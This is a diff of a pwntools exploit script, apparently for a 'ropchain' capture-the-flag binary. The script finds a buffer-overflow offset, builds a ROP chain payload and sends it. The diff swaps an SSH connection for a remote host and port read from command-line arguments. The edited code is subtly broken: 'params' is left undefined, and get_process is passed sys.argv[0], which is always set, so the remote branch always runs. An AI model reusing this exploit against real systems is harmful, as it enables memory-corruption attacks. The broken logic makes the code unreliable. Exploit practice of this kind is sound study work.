@@ -4,22 +4,15 @@ import os
 
 EXECUTABLE = "ropchain"
 LOCAL_PATH = "./"
-REMOTE_PATH = ""
 SSH_SERVER = ""
 
 def get_process_path(is_ssh = False):
-    if is_ssh or os.path.exists(REMOTE_PATH):
-        return REMOTE_PATH + EXECUTABLE
-    else:
-        return LOCAL_PATH + EXECUTABLE
+    return LOCAL_PATH + EXECUTABLE
 
-def get_process(ssh_user = None):
-    is_ssh = ssh_user is not None
-    path = get_process_path(is_ssh)
-    params = {"argv": path, "cwd": os.path.dirname(path)}
-    if is_ssh:
-        s = ssh(host=SSH_SERVER, user=ssh_user)
-        p = s.process(**params)
+def get_process(rem = None):
+
+    if rem:
+        p = remote(sys.argv[2], int(sys.argv[3]))
     else:
         p = process(**params)
     return p
@@ -38,10 +31,6 @@ def get_overflow_offset():
     log.info("Overflow offset: {}".format(offset))
     return offset
 
-
-parser = argparse.ArgumentParser()
-parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username")
-args = parser.parse_args()
 
 e = ELF(get_process_path())
 context.binary = e.path
@@ -71,7 +60,7 @@ print(r.dump())
 
 offset = get_overflow_offset()
 
-p = get_process(args.ssh_user)
+p = get_process(sys.argv[0])
 payload = fit({offset: r.chain()})
 print(hexdump(payload))
 send_payload(p, payload)
